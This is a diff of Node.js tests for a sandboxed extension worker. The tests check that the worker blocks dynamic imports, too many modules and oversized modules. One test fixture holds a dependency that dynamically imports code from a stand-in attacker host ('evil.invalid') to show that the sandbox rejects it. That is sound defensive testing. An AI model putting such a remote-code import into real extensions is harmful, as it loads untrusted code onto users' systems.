@@ -211,7 +211,7 @@ parentPort.postMessage({ type: "__ready__" });
           reject(new Error(`Worker exited unexpectedly (${code})`));
         });
       }),
-      5000,
+      10000,
       "Timed out waiting for extension worker activation"
     );
   } finally {
@@ -329,6 +329,25 @@ test("extension-worker: rejects disallowed imports in dependency modules", async
   }
 });
 
+test("extension-worker: rejects dynamic import() in dependency modules", async () => {
+  const dir = await createTempDir("formula-ext-worker-dep-dynamic-import-");
+  try {
+    await writeFiles(dir, {
+      "main.mjs": `import "./dep.mjs";\nexport async function activate() {}\n`,
+      "dep.mjs": `export async function run() {\n  return import("https://evil.invalid/evil.mjs");\n}\n`
+    });
+    const mainUrl = pathToFileURL(path.join(dir, "main.mjs")).href;
+    const extensionPath = pathToFileURL(`${dir}${path.sep}`).href;
+
+    await assert.rejects(
+      () => activateExtensionWorker({ mainUrl, extensionPath }),
+      /Dynamic import is not allowed/i
+    );
+  } finally {
+    await fs.rm(dir, { recursive: true, force: true });
+  }
+});
+
 test("extension-worker: rejects relative imports that escape the extension base URL", async () => {
   const dir = await createTempDir("formula-ext-worker-escape-relative-import-");
   try {
@@ -341,6 +360,53 @@ test("extension-worker: rejects relative imports that escape the extension base 
     await assert.rejects(
       () => activateExtensionWorker({ mainUrl, extensionPath }),
       /resolved outside the extension base URL/i
+    );
+  } finally {
+    await fs.rm(dir, { recursive: true, force: true });
+  }
+});
+
+test("extension-worker: rejects module graphs that exceed maxModules", async () => {
+  const dir = await createTempDir("formula-ext-worker-maxmodules-");
+  try {
+    /** @type {Record<string, string>} */
+    const files = {
+      "main.mjs": `import "./mod1.mjs";\nexport async function activate() {}\n`
+    };
+
+    // Total modules = main + 200 deps = 201. Limit is 200.
+    for (let i = 1; i <= 200; i++) {
+      const next = i === 200 ? "" : `import "./mod${i + 1}.mjs";\n`;
+      files[`mod${i}.mjs`] = `${next}export const value = ${i};\n`;
+    }
+
+    await writeFiles(dir, files);
+    const mainUrl = pathToFileURL(path.join(dir, "main.mjs")).href;
+    const extensionPath = pathToFileURL(`${dir}${path.sep}`).href;
+
+    await assert.rejects(
+      () => activateExtensionWorker({ mainUrl, extensionPath }),
+      /exceeded limit of 200 modules/i
+    );
+  } finally {
+    await fs.rm(dir, { recursive: true, force: true });
+  }
+});
+
+test("extension-worker: rejects modules that exceed maxModuleBytes", async () => {
+  const dir = await createTempDir("formula-ext-worker-maxmodulebytes-");
+  try {
+    const bigComment = "a".repeat(270 * 1024);
+    await writeFiles(dir, {
+      "main.mjs": `import "./big.mjs";\nexport async function activate() {}\n`,
+      "big.mjs": `/*${bigComment}*/\nexport const x = 1;\n`
+    });
+    const mainUrl = pathToFileURL(path.join(dir, "main.mjs")).href;
+    const extensionPath = pathToFileURL(`${dir}${path.sep}`).href;
+
+    await assert.rejects(
+      () => activateExtensionWorker({ mainUrl, extensionPath }),
+      /module too large/i
     );
   } finally {
     await fs.rm(dir, { recursive: true, force: true });
